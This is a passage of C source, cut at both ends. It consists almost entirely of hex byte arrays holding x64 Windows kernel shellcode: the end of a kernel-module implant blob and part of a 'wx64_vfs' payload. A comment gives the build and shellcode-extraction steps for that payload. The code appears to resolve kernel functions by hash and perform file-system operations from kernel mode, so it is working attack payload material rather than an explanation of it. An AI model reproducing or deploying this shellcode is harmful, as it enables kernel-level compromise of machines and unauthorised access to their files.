		0x41, 0x58, 0x5e, 0x5f, 0x5a, 0x59, 0x5b, 0x58, 0xc3, 0xcc, 0xcc, 0xcc,
		0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x68, 0x10, 0x48,
		0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x48, 0x63, 0x41, 0x3c, 0x8b,
		0xea, 0x33, 0xd2, 0x44, 0x8b, 0x84, 0x08, 0x88, 0x00, 0x00, 0x00, 0x4c,
		0x03, 0xc1, 0x45, 0x8b, 0x50, 0x20, 0x41, 0x8b, 0x78, 0x24, 0x4c, 0x03,
		0xd1, 0x41, 0x8b, 0x58, 0x1c, 0x48, 0x03, 0xf9, 0x41, 0x8b, 0x70, 0x18,
		0x48, 0x03, 0xd9, 0x85, 0xf6, 0x74, 0x2e, 0x45, 0x8b, 0x0a, 0x4c, 0x03,
		0xc9, 0x45, 0x33, 0xdb, 0xeb, 0x0d, 0x0f, 0xb6, 0xc0, 0x49, 0xff, 0xc1,
		0x41, 0xc1, 0xcb, 0x0d, 0x44, 0x03, 0xd8, 0x41, 0x8a, 0x01, 0x84, 0xc0,
		0x75, 0xec, 0x44, 0x3b, 0xdd, 0x74, 0x21, 0xff, 0xc2, 0x49, 0x83, 0xc2,
		0x04, 0x3b, 0xd6, 0x72, 0xd2, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x08,
		0x48, 0x8b, 0x6c, 0x24, 0x10, 0x48, 0x8b, 0x74, 0x24, 0x18, 0x48, 0x8b,
		0x7c, 0x24, 0x20, 0xc3, 0x0f, 0xb7, 0x14, 0x57, 0x41, 0x3b, 0x50, 0x14,
		0x73, 0xdf, 0x8b, 0x04, 0x93, 0x48, 0x03, 0xc1, 0xeb, 0xd9, 0xcc, 0xcc,
		0x48, 0x89, 0x5c, 0x24, 0x08, 0x48, 0x89, 0x6c, 0x24, 0x10, 0x48, 0x89,
		0x74, 0x24, 0x18, 0x57, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xec, 0x20,
		0x48, 0x8b, 0xf2, 0x4d, 0x8b, 0xf0, 0xba, 0xf9, 0xbe, 0xdd, 0x05, 0x48,
		0x8b, 0xe9, 0xe8, 0x39, 0xff, 0xff, 0xff, 0xba, 0xc9, 0xc5, 0x6e, 0x6c,
		0x48, 0x8b, 0xcd, 0x48, 0x8b, 0xd8, 0xe8, 0x29, 0xff, 0xff, 0xff, 0x41,
		0xbf, 0x00, 0x10, 0x00, 0x00, 0x45, 0x33, 0xc0, 0x41, 0x8b, 0xd7, 0x41,
		0x8b, 0xcf, 0x48, 0x8b, 0xf8, 0xff, 0xd3, 0x48, 0x85, 0xc0, 0x74, 0x3a,
		0x4c, 0x39, 0xb0, 0xa0, 0x00, 0x00, 0x00, 0x75, 0x29, 0x0f, 0xb7, 0x4e,
		0x02, 0x48, 0xff, 0x80, 0xb8, 0x00, 0x00, 0x00, 0x48, 0x39, 0x88, 0xb8,
		0x00, 0x00, 0x00, 0x75, 0x15, 0x41, 0x8b, 0xd7, 0x48, 0x8b, 0xc8, 0xff,
		0xd7, 0x48, 0x8b, 0xd6, 0x48, 0x8b, 0xcd, 0xe8, 0x24, 0x00, 0x00, 0x00,
		0xeb, 0x08, 0x49, 0x8b, 0xd7, 0x48, 0x8b, 0xc8, 0xff, 0xd7, 0x48, 0x8b,
		0x5c, 0x24, 0x40, 0x48, 0x8b, 0x6c, 0x24, 0x48, 0x48, 0x8b, 0x74, 0x24,
		0x50, 0x48, 0x83, 0xc4, 0x20, 0x41, 0x5f, 0x41, 0x5e, 0x5f, 0xc3, 0xcc,
		0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x70, 0x10, 0x48,
		0x89, 0x78, 0x18, 0x55, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57,
		0x48, 0x8d, 0x68, 0xa1, 0x48, 0x81, 0xec, 0xa0, 0x00, 0x00, 0x00, 0x48,
		0x8b, 0xda, 0x48, 0x8b, 0xf1, 0xba, 0xf9, 0xbe, 0xdd, 0x05, 0xe8, 0x89,
		0xfe, 0xff, 0xff, 0xba, 0xc9, 0xc5, 0x6e, 0x6c, 0x48, 0x8b, 0xce, 0x4c,
		0x8b, 0xf8, 0xe8, 0x79, 0xfe, 0xff, 0xff, 0xba, 0x57, 0x63, 0x32, 0x5a,
		0x48, 0x8b, 0xce, 0x4c, 0x8b, 0xe0, 0xe8, 0x69, 0xfe, 0xff, 0xff, 0xba,
		0xdb, 0x4f, 0x3d, 0xc5, 0x48, 0x8b, 0xce, 0x4c, 0x8b, 0xe8, 0xe8, 0x59,
		0xfe, 0xff, 0xff, 0x45, 0x33, 0xc0, 0xba, 0x00, 0x10, 0x00, 0x00, 0xb9,
		0x00, 0x30, 0x00, 0x00, 0x4c, 0x8b, 0xf0, 0x41, 0xff, 0xd7, 0x48, 0x8b,
		0xf8, 0x48, 0x85, 0xc0, 0x0f, 0x84, 0x03, 0x01, 0x00, 0x00, 0xba, 0x00,
		0x10, 0x00, 0x00, 0x48, 0x8b, 0xc8, 0x41, 0xff, 0xd6, 0x48, 0x89, 0x77,
		0x08, 0x4c, 0x8d, 0xb7, 0x58, 0x03, 0x00, 0x00, 0x48, 0xc7, 0x47, 0x50,
		0x01, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x75, 0xe3, 0x48, 0xb8, 0x77, 0x33,
		0x33, 0x11, 0x77, 0x33, 0x11, 0xff, 0xc7, 0x45, 0xb7, 0x1f, 0x9d, 0x48,
		0x9d, 0x48, 0x89, 0x07, 0x48, 0x8b, 0xd3, 0x8b, 0x4b, 0x08, 0x8b, 0x43,
		0x0c, 0x48, 0x2b, 0xd1, 0x48, 0x03, 0xc2, 0xc7, 0x45, 0xbb, 0x92, 0xf5,
		0x45, 0x13, 0x48, 0x89, 0x47, 0x58, 0x8b, 0x43, 0x10, 0x48, 0x03, 0xc2,
		0xc7, 0x45, 0xbf, 0xbc, 0x1e, 0x36, 0x9f, 0x48, 0x89, 0x47, 0x60, 0x8b,
		0x43, 0x14, 0xbb, 0x0b, 0x00, 0x00, 0x00, 0x48, 0x03, 0xc2, 0xc7, 0x45,
		0xc3, 0x57, 0x63, 0x32, 0x5a, 0x48, 0x89, 0x47, 0x68, 0xc7, 0x45, 0xc7,
		0x6f, 0xa5, 0x77, 0x49, 0xc7, 0x45, 0xcb, 0xf9, 0xbe, 0xdd, 0x05, 0xc7,
		0x45, 0xcf, 0xc9, 0xc5, 0x6e, 0x6c, 0xc7, 0x45, 0xd3, 0x02, 0x6b, 0xa0,
		0x94, 0xc7, 0x45, 0xd7, 0x9b, 0x97, 0x64, 0xcf, 0xc7, 0x45, 0xdb, 0x89,
		0x4d, 0x3f, 0xbc, 0xc7, 0x45, 0xdf, 0x92, 0x6d, 0x58, 0x58, 0x48, 0x8b,
		0x4f, 0x08, 0x48, 0x8d, 0x76, 0xfc, 0x8b, 0x16, 0x4d, 0x8d, 0x76, 0xf8,
		0xe8, 0x7f, 0xfd, 0xff, 0xff, 0x49, 0x89, 0x06, 0x83, 0xc3, 0xff, 0x75,
		0xe5, 0xbe, 0x00, 0x10, 0x00, 0x00, 0x45, 0x33, 0xc0, 0x8b, 0xd6, 0x8b,
		0xce, 0x41, 0xff, 0xd7, 0x48, 0x8b, 0xcf, 0x48, 0x8b, 0xd8, 0x41, 0xff,
		0xd5, 0x48, 0x89, 0x83, 0xc0, 0x00, 0x00, 0x00, 0x8b, 0xd6, 0x48, 0xb8,
		0x77, 0x33, 0x33, 0x11, 0x77, 0x33, 0x11, 0xff, 0x48, 0x8b, 0xcb, 0x48,
		0x89, 0x83, 0xb0, 0x00, 0x00, 0x00, 0x41, 0xff, 0xd4, 0x48, 0x8b, 0xcf,
		0xe8, 0x23, 0x00, 0x00, 0x00, 0x4c, 0x8d, 0x9c, 0x24, 0xa0, 0x00, 0x00,
		0x00, 0x49, 0x8b, 0x5b, 0x30, 0x49, 0x8b, 0x73, 0x38, 0x49, 0x8b, 0x7b,
		0x40, 0x49, 0x8b, 0xe3, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c,
		0x5d, 0xc3, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x10, 0x48, 0x89, 0x6c,
		0x24, 0x18, 0x56, 0x57, 0x41, 0x56, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b,
		0xd9, 0x48, 0xc7, 0x44, 0x24, 0x40, 0xf0, 0xd8, 0xff, 0xff, 0xb9, 0x00,
		0x00, 0x00, 0x01, 0x41, 0xbe, 0xff, 0xff, 0xff, 0xff, 0x33, 0xed, 0x41,
		0x8b, 0xd6, 0x8b, 0xf5, 0x48, 0x89, 0x4b, 0x18, 0xff, 0x93, 0x10, 0x03,
		0x00, 0x00, 0x48, 0x8b, 0xf8, 0x48, 0x85, 0xc0, 0x75, 0x2c, 0xb9, 0x00,
		0x00, 0x40, 0x00, 0x41, 0x8b, 0xd6, 0x48, 0x89, 0x4b, 0x18, 0xff, 0x93,
		0x10, 0x03, 0x00, 0x00, 0x48, 0x8b, 0xf8, 0x48, 0x85, 0xc0, 0x75, 0x12,
		0xb8, 0x01, 0x00, 0x00, 0xf0, 0x48, 0x89, 0x6b, 0x18, 0x48, 0x89, 0x43,
		0x30, 0xe9, 0xae, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xcf, 0x48, 0x89, 0x7b,
		0x28, 0xff, 0x93, 0x18, 0x03, 0x00, 0x00, 0x48, 0x89, 0x43, 0x20, 0x41,
		0xbe, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x83, 0xf8, 0x0f, 0x00, 0x00,
		0x4c, 0x89, 0x73, 0x30, 0x48, 0x85, 0xc0, 0x75, 0x23, 0x49, 0x03, 0xf6,
		0x48, 0xb8, 0x00, 0xe4, 0x0b, 0x54, 0x02, 0x00, 0x00, 0x00, 0x48, 0x3b,
		0xf0, 0x76, 0xde, 0x4c, 0x8d, 0x44, 0x24, 0x40, 0x33, 0xd2, 0x33, 0xc9,
		0xff, 0x93, 0x50, 0x03, 0x00, 0x00, 0xeb, 0xcd, 0x48, 0xc7, 0x43, 0x30,
		0x02, 0x00, 0x00, 0x00, 0x48, 0x83, 0xf8, 0x03, 0x0f, 0x84, 0x2a, 0x01,
		0x00, 0x00, 0x48, 0x83, 0xf8, 0x04, 0x75, 0x4c, 0xff, 0x93, 0x20, 0x03,
		0x00, 0x00, 0x48, 0x8b, 0xf0, 0x48, 0x85, 0xc0, 0x75, 0x06, 0x48, 0x89,
		0x6b, 0x38, 0xeb, 0x38, 0x4c, 0x8b, 0xc5, 0x48, 0x39, 0x28, 0x75, 0x06,
		0x48, 0x39, 0x68, 0x08, 0x74, 0x09, 0x4d, 0x03, 0xc6, 0x48, 0x83, 0xc0,
		0x10, 0xeb, 0xec, 0x49, 0xc1, 0xe0, 0x04, 0x48, 0x8b, 0xd6, 0x48, 0x8b,
		0xcf, 0x4c, 0x89, 0x43, 0x48, 0xff, 0x93, 0x40, 0x03, 0x00, 0x00, 0x48,
		0x8b, 0xce, 0xff, 0x93, 0x00, 0x03, 0x00, 0x00, 0x4c, 0x89, 0x73, 0x38,
		0x48, 0x83, 0xbb, 0xf8, 0x0f, 0x00, 0x00, 0x05, 0x75, 0x18, 0x48, 0x8b,
		0xcb, 0x48, 0x39, 0xab, 0x68, 0x01, 0x00, 0x00, 0x74, 0x05, 0xff, 0x53,
		0x60, 0xeb, 0x03, 0xff, 0x53, 0x58, 0x4c, 0x89, 0x73, 0x38, 0x48, 0x8b,
		0x83, 0xf8, 0x0f, 0x00, 0x00, 0x49, 0x2b, 0xc6, 0x49, 0x3b, 0xc6, 0x77,
		0x5a, 0x48, 0x39, 0xab, 0x68, 0x01, 0x00, 0x00, 0x74, 0x4d, 0x48, 0x8b,
		0x53, 0x48, 0x45, 0x33, 0xc0, 0x48, 0x8b, 0x4b, 0x40, 0xff, 0x93, 0x28,
		0x03, 0x00, 0x00, 0x48, 0x8b, 0xf0, 0x48, 0x85, 0xc0, 0x74, 0x34, 0x4c,
		0x8b, 0x43, 0x48, 0x4c, 0x39, 0xb3, 0xf8, 0x0f, 0x00, 0x00, 0x75, 0x08,
		0x48, 0x8b, 0xd0, 0x48, 0x8b, 0xcf, 0xeb, 0x06, 0x48, 0x8b, 0xd7, 0x48,
		0x8b, 0xce, 0xff, 0x93, 0x40, 0x03, 0x00, 0x00, 0x48, 0x8b, 0x53, 0x48,
		0x48, 0x8b, 0xce, 0xff, 0x93, 0x30, 0x03, 0x00, 0x00, 0x4c, 0x89, 0x73,
		0x38, 0xeb, 0x04, 0x48, 0x89, 0x6b, 0x38, 0x48, 0x83, 0xbb, 0xf8, 0x0f,
		0x00, 0x00, 0x06, 0x75, 0x15, 0x4c, 0x8b, 0x43, 0x48, 0x48, 0x8b, 0xcf,
		0x48, 0x8b, 0x53, 0x40, 0xff, 0x93, 0x40, 0x03, 0x00, 0x00, 0x4c, 0x89,
		0x73, 0x38, 0x48, 0x83, 0xbb, 0xf8, 0x0f, 0x00, 0x00, 0x07, 0x75, 0x15,
		0x4c, 0x8b, 0x43, 0x48, 0x48, 0x8b, 0xd7, 0x48, 0x8b, 0x4b, 0x40, 0xff,
		0x93, 0x40, 0x03, 0x00, 0x00, 0x4c, 0x89, 0x73, 0x38, 0x48, 0x89, 0xab,
		0xf8, 0x0f, 0x00, 0x00, 0x48, 0x8b, 0xf5, 0xe9, 0x91, 0xfe, 0xff, 0xff,
		0xb8, 0x00, 0x00, 0x00, 0xf0, 0x48, 0x8b, 0xcf, 0x48, 0x89, 0x43, 0x30,
		0xff, 0x93, 0x08, 0x03, 0x00, 0x00, 0x48, 0x89, 0x6b, 0x20, 0x48, 0x89,
		0x6b, 0x28, 0x4c, 0x89, 0x73, 0x38, 0x48, 0x89, 0x2b, 0x48, 0x89, 0xab,
		0xf8, 0x0f, 0x00, 0x00, 0x48, 0x8b, 0x5c, 0x24, 0x48, 0x48, 0x8b, 0x6c,
		0x24, 0x50, 0x48, 0x83, 0xc4, 0x20, 0x41, 0x5e, 0x5f, 0x5e, 0xc3
	};
	*ppb = WINX64_KMD_BIN;
	*pcb = sizeof(WINX64_KMD_BIN);
}

// standard wx64_vfs payload, compile and extract shellcode with:
// 
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_common.c
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_vfs.c
// ml64 wx64_common_a.asm /Fewx64_vfs.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main wx64_vfs.obj wx64_common.obj
// shellcode64.exe -o wx64_vfs.exe
// xxd -i wx64_vfs.bin
VOID GetData_VFS(PBYTE *ppb, PDWORD pcb)
{
	BYTE WINX64_VFS_BIN[] = {
		0x56, 0x48, 0x8b, 0xf4, 0x48, 0x83, 0xe4, 0xf0, 0x48, 0x83, 0xec, 0x20,
		0xe8, 0xb7, 0x06, 0x00, 0x00, 0x48, 0x8b, 0xe6, 0x5e, 0xc3, 0x0f, 0x20,
		0xd8, 0xc3, 0x0f, 0x09, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24,
		0x08, 0x48, 0x89, 0x7c, 0x24, 0x18, 0x55, 0x48, 0x8d, 0x6c, 0x24, 0xa9,
		0x48, 0x81, 0xec, 0xb0, 0x00, 0x00, 0x00, 0x48, 0x83, 0x65, 0x6f, 0x00,
		0x48, 0x8d, 0x4d, 0x17, 0x48, 0x8b, 0xfa, 0x49, 0x8b, 0xd8, 0xba, 0x10,
		0x00, 0x00, 0x00, 0xff, 0x97, 0x80, 0x00, 0x00, 0x00, 0xba, 0x30, 0x00,
		0x00, 0x00, 0x48, 0x8d, 0x4d, 0x27, 0xff, 0x97, 0x80, 0x00, 0x00, 0x00,
		0x48, 0x8d, 0x93, 0x1c, 0x01, 0x00, 0x00, 0x48, 0x8d, 0x4d, 0x07, 0xff,
		0x57, 0x78, 0x83, 0x64, 0x24, 0x50, 0x00, 0x48, 0x8d, 0x45, 0x07, 0x48,
		0x83, 0x64, 0x24, 0x48, 0x00, 0x4c, 0x8d, 0x4d, 0x17, 0x48, 0x83, 0x65,
		0x2f, 0x00, 0x4c, 0x8d, 0x45, 0x27, 0xc7, 0x44, 0x24, 0x40, 0x20, 0x00,
		0x00, 0x00, 0x48, 0x8d, 0x4d, 0x6f, 0x48, 0x89, 0x45, 0x37, 0x0f, 0x57,
		0xc0, 0xb8, 0x03, 0x00, 0x00, 0x00, 0x48, 0xc7, 0x45, 0x27, 0x30, 0x00,
		0x00, 0x00, 0x89, 0x44, 0x24, 0x38, 0xba, 0x00, 0x00, 0x00, 0x80, 0x89,
		0x44, 0x24, 0x30, 0xc7, 0x44, 0x24, 0x28, 0x80, 0x00, 0x00, 0x00, 0x48,
		0x83, 0x64, 0x24, 0x20, 0x00, 0x48, 0xc7, 0x45, 0x3f, 0x40, 0x02, 0x00,
		0x00, 0xf3, 0x0f, 0x7f, 0x45, 0x47, 0xff, 0x97, 0x90, 0x00, 0x00, 0x00,
		0x48, 0x8b, 0x4d, 0x6f, 0x8b, 0xd8, 0x48, 0x85, 0xc9, 0x74, 0x06, 0xff,
		0x97, 0x88, 0x00, 0x00, 0x00, 0x4c, 0x8d, 0x9c, 0x24, 0xb0, 0x00, 0x00,
		0x00, 0x8b, 0xc3, 0x49, 0x8b, 0x5b, 0x10, 0x49, 0x8b, 0x7b, 0x20, 0x49,
		0x8b, 0xe3, 0x5d, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x08, 0x48, 0x89, 0x7c,
		0x24, 0x18, 0x55, 0x48, 0x8d, 0x6c, 0x24, 0xa9, 0x48, 0x81, 0xec, 0xb0,
		0x00, 0x00, 0x00, 0x48, 0x83, 0x65, 0x6f, 0x00, 0x48, 0x8d, 0x4d, 0x17,
		0x48, 0x8b, 0xfa, 0x49, 0x8b, 0xd8, 0xba, 0x10, 0x00, 0x00, 0x00, 0xff,
		0x97, 0x80, 0x00, 0x00, 0x00, 0xba, 0x30, 0x00, 0x00, 0x00, 0x48, 0x8d,
		0x4d, 0x27, 0xff, 0x97, 0x80, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x93, 0x1c,
		0x01, 0x00, 0x00, 0x48, 0x8d, 0x4d, 0x07, 0xff, 0x57, 0x78, 0x83, 0x64,
		0x24, 0x50, 0x00, 0x48, 0x8d, 0x45, 0x07, 0x48, 0x83, 0x64, 0x24, 0x48,
		0x00, 0x4c, 0x8d, 0x4d, 0x17, 0x48, 0x83, 0x65, 0x2f, 0x00, 0x4c, 0x8d,
		0x45, 0x27, 0xc7, 0x44, 0x24, 0x40, 0x00, 0x10, 0x00, 0x00, 0x48, 0x8d,
		0x4d, 0x6f, 0xc7, 0x44, 0x24, 0x38, 0x01, 0x00, 0x00, 0x00, 0x0f, 0x57,
		0xc0, 0xc7, 0x44, 0x24, 0x30, 0x04, 0x00, 0x00, 0x00, 0xba, 0x00, 0x00,
		0x00, 0x40, 0xc7, 0x44, 0x24, 0x28, 0x80, 0x00, 0x00, 0x00, 0x48, 0x83,
		0x64, 0x24, 0x20, 0x00, 0x48, 0xc7, 0x45, 0x27, 0x30, 0x00, 0x00, 0x00,
		0x48, 0xc7, 0x45, 0x3f, 0x40, 0x02, 0x00, 0x00, 0x48, 0x89, 0x45, 0x37,
		0xf3, 0x0f, 0x7f, 0x45, 0x47, 0xff, 0x97, 0x90, 0x00, 0x00, 0x00, 0x48,
		0x8b, 0x4d, 0x6f, 0x8b, 0xd8, 0x48, 0x85, 0xc9, 0x74, 0x06, 0xff, 0x97,
		0x88, 0x00, 0x00, 0x00, 0x4c, 0x8d, 0x9c, 0x24, 0xb0, 0x00, 0x00, 0x00,
		0x8b, 0xc3, 0x49, 0x8b, 0x5b, 0x10, 0x49, 0x8b, 0x7b, 0x20, 0x49, 0x8b,
		0xe3, 0x5d, 0xc3, 0xcc, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x10, 0x48,
		0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x55, 0x41, 0x54, 0x41, 0x55,
		0x41, 0x56, 0x41, 0x57, 0x48, 0x8d, 0x68, 0xa1, 0x48, 0x81, 0xec, 0xb0,
		0x00, 0x00, 0x00, 0x33, 0xc0, 0x48, 0x8b, 0xd9, 0x48, 0x8b, 0x89, 0x10,
		0x02, 0x00, 0x00, 0x49, 0x8b, 0xf8, 0x48, 0x89, 0x45, 0x67, 0x4c, 0x8b,
		0xfa, 0x44, 0x8b, 0xf0, 0x48, 0x81, 0xf9, 0x00, 0x00, 0x20, 0x00, 0x73,
		0x0a, 0xb8, 0x07, 0x00, 0x00, 0xf0, 0xe9, 0xd5, 0x01, 0x00, 0x00, 0x4c,
		0x8b, 0x63, 0x28, 0x48, 0x81, 0xc1, 0x00, 0x00, 0xf0, 0xff, 0x4c, 0x03,
		0xa3, 0x08, 0x02, 0x00, 0x00, 0x48, 0xb8, 0x8f, 0xe3, 0x38, 0x8e, 0xe3,
		0x38, 0x8e, 0xe3, 0x48, 0xf7, 0xe1, 0x48, 0x8d, 0x4d, 0xe7, 0x4c, 0x8b,
		0xea, 0xba, 0x10, 0x00, 0x00, 0x00, 0x49, 0xc1, 0xed, 0x09, 0x41, 0xff,
		0x97, 0x80, 0x00, 0x00, 0x00, 0xbe, 0x30, 0x00, 0x00, 0x00, 0x48, 0x8d,
		0x4d, 0x07, 0x8b, 0xd6, 0x41, 0xff, 0x97, 0x80, 0x00, 0x00, 0x00, 0x48,
		0x8d, 0x97, 0x1c, 0x01, 0x00, 0x00, 0x48, 0x8d, 0x4d, 0xf7, 0x41, 0xff,
		0x57, 0x78, 0x4c, 0x21, 0x75, 0x0f, 0x48, 0x8d, 0x45, 0xf7, 0x0f, 0x57,
		0xc0, 0xc7, 0x44, 0x24, 0x28, 0x21, 0x40, 0x00, 0x00, 0x4c, 0x8d, 0x4d,
		0xe7, 0x48, 0x89, 0x45, 0x17, 0x4c, 0x8d, 0x45, 0x07, 0x48, 0x89, 0x75,
		0x07, 0xba, 0x01, 0x00, 0x10, 0x00, 0x48, 0xc7, 0x45, 0x1f, 0x40, 0x02,
		0x00, 0x00, 0x48, 0x8d, 0x4d, 0x67, 0xc7, 0x44, 0x24, 0x20, 0x03, 0x00,
		0x00, 0x00, 0xf3, 0x0f, 0x7f, 0x45, 0x27, 0x41, 0xff, 0x97, 0x98, 0x00,
		0x00, 0x00, 0x33, 0xd2, 0x8b, 0xf8, 0x85, 0xc0, 0x0f, 0x85, 0x01, 0x01,
		0x00, 0x00, 0xc6, 0x44, 0x24, 0x50, 0x01, 0xe9, 0x96, 0x00, 0x00, 0x00,
		0x48, 0x39, 0x55, 0xef, 0x0f, 0x84, 0xed, 0x00, 0x00, 0x00, 0xba, 0x40,
		0x02, 0x00, 0x00, 0x49, 0x8b, 0xcc, 0x41, 0xff, 0x97, 0x80, 0x00, 0x00,
		0x00, 0x48, 0x8b, 0x46, 0x28, 0x48, 0x8d, 0x56, 0x5e, 0x49, 0x89, 0x44,
		0x24, 0x30, 0x48, 0x8b, 0x46, 0x10, 0x49, 0x89, 0x44, 0x24, 0x08, 0x48,
		0x8b, 0x46, 0x08, 0x49, 0x89, 0x44, 0x24, 0x18, 0x48, 0x8b, 0x46, 0x20,
		0x49, 0x83, 0x0c, 0x24, 0x10, 0x49, 0x89, 0x44, 0x24, 0x10, 0x8b, 0x46,
		0x38, 0x24, 0x10, 0xf6, 0xd8, 0x48, 0x1b, 0xc9, 0x48, 0xf7, 0xd9, 0x48,
		0xff, 0xc1, 0x49, 0x09, 0x0c, 0x24, 0xb9, 0x03, 0x01, 0x00, 0x00, 0x8b,
		0x46, 0x3c, 0x3b, 0xc1, 0x0f, 0x47, 0xc1, 0x49, 0x8d, 0x4c, 0x24, 0x38,
		0x44, 0x8b, 0xc0, 0x41, 0xff, 0x57, 0x60, 0x33, 0xd2, 0x49, 0x81, 0xc4,
		0x40, 0x02, 0x00, 0x00, 0x49, 0xff, 0xc6, 0x4d, 0x3b, 0xf5, 0x73, 0x73,
		0x8b, 0x06, 0x85, 0xc0, 0x74, 0x08, 0x48, 0x03, 0xf0, 0xe9, 0x78, 0xff,
		0xff, 0xff, 0x88, 0x54, 0x24, 0x50, 0x48, 0x8b, 0x4b, 0x28, 0x48, 0x8d,
		0x45, 0xe7, 0x48, 0x03, 0x8b, 0x10, 0x02, 0x00, 0x00, 0x45, 0x33, 0xc9,
		0x48, 0x8b, 0xb3, 0x08, 0x02, 0x00, 0x00, 0x45, 0x33, 0xc0, 0x48, 0x89,
		0x54, 0x24, 0x48, 0x48, 0x81, 0xc6, 0x00, 0x00, 0xf0, 0xff, 0x88, 0x54,
		0x24, 0x40, 0x48, 0x03, 0xf1, 0x48, 0x8b, 0x4d, 0x67, 0x48, 0xc7, 0x44,
		0x24, 0x38, 0x03, 0x00, 0x00, 0x00, 0xc7, 0x44, 0x24, 0x30, 0x00, 0x00,
		0x10, 0x00, 0x48, 0x89, 0x74, 0x24, 0x28, 0x48, 0x89, 0x44, 0x24, 0x20,
		0x41, 0xff, 0x97, 0xa0, 0x00, 0x00, 0x00, 0x33, 0xd2, 0x8b, 0xf8, 0x85,
		0xc0, 0x0f, 0x84, 0x09, 0xff, 0xff, 0xff, 0x48, 0x8b, 0x4d, 0x67, 0x4b,
		0x8d, 0x04, 0xf6, 0x48, 0xc1, 0xe0, 0x06, 0x48, 0x89, 0x83, 0x00, 0x02,
		0x00, 0x00, 0x48, 0x85, 0xc9, 0x74, 0x09, 0x41, 0xff, 0x97, 0x88, 0x00,
		0x00, 0x00, 0x33, 0xd2, 0x4d, 0x85, 0xf6, 0x0f, 0x45, 0xfa, 0x8b, 0xc7,
		0x4c, 0x8d, 0x9c, 0x24, 0xb0, 0x00, 0x00, 0x00, 0x49, 0x8b, 0x5b, 0x38,
		0x49, 0x8b, 0x73, 0x40, 0x49, 0x8b, 0x7b, 0x48, 0x49, 0x8b, 0xe3, 0x41,
		0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5d, 0xc3, 0xcc, 0xcc, 0xcc,
		0x48, 0x89, 0x5c, 0x24, 0x08, 0x48, 0x89, 0x74, 0x24, 0x18, 0x55, 0x57,
		0x41, 0x56, 0x48, 0x8d, 0x6c, 0x24, 0xb9, 0x48, 0x81, 0xec, 0xb0, 0x00,
		0x00, 0x00, 0x48, 0x83, 0x65, 0x6f, 0x00, 0x48, 0x8b, 0xfa, 0x48, 0x8b,
		0xf1, 0xbb, 0x30, 0x00, 0x00, 0x00, 0x8b, 0xd3, 0x48, 0x8d, 0x4d, 0x17,
		0x4d, 0x8b, 0xf0, 0xff, 0x97, 0x80, 0x00, 0x00, 0x00, 0x8d, 0x53, 0xe0,
		0x48, 0x8d, 0x4d, 0xf7, 0xff, 0x97, 0x80, 0x00, 0x00, 0x00, 0x49, 0x8d,
		0x96, 0x1c, 0x01, 0x00, 0x00, 0x48, 0x8d, 0x4d, 0x07, 0xff, 0x57, 0x78,
		0x83, 0x64, 0x24, 0x50, 0x00, 0x48, 0x8d, 0x45, 0x07, 0x48, 0x83, 0x64,
		0x24, 0x48, 0x00, 0x4c, 0x8d, 0x4d, 0xf7, 0x48, 0x83, 0x65, 0x1f, 0x00,
		0x4c, 0x8d, 0x45, 0x17, 0xc7, 0x44, 0x24, 0x40, 0x20, 0x00, 0x00, 0x00,
		0x48, 0x8d, 0x4d, 0x6f, 0xc7, 0x44, 0x24, 0x38, 0x01, 0x00, 0x00, 0x00,
		0x0f, 0x57, 0xc0, 0xc7, 0x44, 0x24, 0x30, 0x03, 0x00, 0x00, 0x00, 0xba,
		0x00, 0x00, 0x00, 0x80, 0xc7, 0x44, 0x24, 0x28, 0x80, 0x00, 0x00, 0x00,
		0x48, 0x83, 0x64, 0x24, 0x20, 0x00, 0x48, 0x89, 0x5d, 0x17, 0x48, 0xc7,
		0x45, 0x2f, 0x40, 0x02, 0x00, 0x00, 0x48, 0x89, 0x45, 0x27, 0xf3, 0x0f,
		0x7f, 0x45, 0x37, 0xff, 0x97, 0x90, 0x00, 0x00, 0x00, 0x8b, 0xd8, 0x85,
		0xc0, 0x75, 0x59, 0x48, 0x83, 0x64, 0x24, 0x40, 0x00, 0x49, 0x8d, 0x86,
		0x28, 0x03, 0x00, 0x00, 0x48, 0x8b, 0x8e, 0x08, 0x02, 0x00, 0x00, 0x45,
		0x33, 0xc9, 0x48, 0x03, 0x4e, 0x28, 0x45, 0x33, 0xc0, 0x48, 0x89, 0x44,
		0x24, 0x38, 0x33, 0xd2, 0x41, 0x8b, 0x86, 0x30, 0x03, 0x00, 0x00, 0x89,
		0x44, 0x24, 0x30, 0x48, 0x8d, 0x45, 0xf7, 0x48, 0x89, 0x4c, 0x24, 0x28,
		0x48, 0x8b, 0x4d, 0x6f, 0x48, 0x89, 0x44, 0x24, 0x20, 0xff, 0x97, 0xb8,
		0x00, 0x00, 0x00, 0x8b, 0xd8, 0x85, 0xc0, 0x75, 0x0b, 0x48, 0x8b, 0x45,
		0xff, 0x48, 0x89, 0x86, 0x00, 0x02, 0x00, 0x00, 0x48, 0x8b, 0x4d, 0x6f,
		0x48, 0x85, 0xc9, 0x74, 0x06, 0xff, 0x97, 0x88, 0x00, 0x00, 0x00, 0x4c,
		0x8d, 0x9c, 0x24, 0xb0, 0x00, 0x00, 0x00, 0x8b, 0xc3, 0x49, 0x8b, 0x5b,
